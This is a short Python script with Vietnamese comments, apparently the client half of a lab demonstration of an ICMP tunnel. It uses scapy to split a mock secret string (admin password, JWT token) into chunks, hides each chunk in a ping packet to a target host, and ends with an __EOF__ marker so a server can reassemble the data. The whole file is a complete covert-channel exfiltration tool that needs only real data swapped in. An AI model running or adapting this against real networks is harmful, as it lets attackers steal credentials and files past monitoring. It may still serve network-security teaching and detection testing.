#!/usr/bin/env python3
# icmp_client.py - May khach tuon lén tai lieu mat qua cac goi tin Ping ICMP
# Ho tro: Chay linh hoat qua mang Wi-Fi 2 may that hoac namespace
import sys
import time
from scapy.all import *

target = sys.argv[1] if len(sys.argv) > 1 else "10.0.0.2"
iface  = sys.argv[2] if len(sys.argv) > 2 else None
chunk_size = 24  # Chia nho moi goi tin mang 24 byte du lieu

# Tao du lieu gia lap tai lieu mat
secret_data = b"CONFIDENTIAL-DATA: User=admin Pass=SecretPassword123 Token=JWT-XYZ-999"

print("==================================================================")
print(f"[*] CLIENT DANG TUON DU LIEU MAT QUA ICMP TUNNEL (TOI {target})")
print("==================================================================")
print(f"[*] Tong du lieu: {len(secret_data)} bytes")
print(f"[*] Noi dung: {secret_data.decode()}\n")

total_chunks = (len(secret_data) + chunk_size - 1) // chunk_size

for idx, i in enumerate(range(0, len(secret_data), chunk_size), 1):
    seg = secret_data[i:i+chunk_size]
    print(f"[*] Dang gui manh #{idx:02d}/{total_chunks:02d} ({len(seg)} bytes): {seg}...")
    
    # Tao goi ping mang theo du lieu bi mat trong payload
    pkt = IP(dst=target)/ICMP(type=8, id=0x1337, seq=idx)/seg
    if iface:
        ans = sr1(pkt, iface=iface, timeout=2.5, verbose=0)
    else:
        ans = sr1(pkt, timeout=2.5, verbose=0)
    
    if ans:
        print(f"    [+] Server phan hoi: {bytes(ans[ICMP].payload)}")
    else:
        print("    [-] Khong nhan duoc phan hoi!")
    time.sleep(0.3)

# Gui goi tin bao ket thuc (__EOF__) de server tien hanh ghep noi toan bo du lieu
print("\n[*] Dang gui tin hieu hoan tat (__EOF__) cho server...")
pkt_eof = IP(dst=target)/ICMP(type=8, id=0x1337, seq=total_chunks + 1)/b"__EOF__"
if iface:
    ans_eof = sr1(pkt_eof, iface=iface, timeout=2.5, verbose=0)
else:
    ans_eof = sr1(pkt_eof, timeout=2.5, verbose=0)

if ans_eof:
    print("    [+] Server da xac nhan da nhan xong toan bo du lieu!")

print(f"\n[+] HOAN TAT TUON DU LIEU QUA ICMP TUNNEL TOI {target} THANH CONG!")
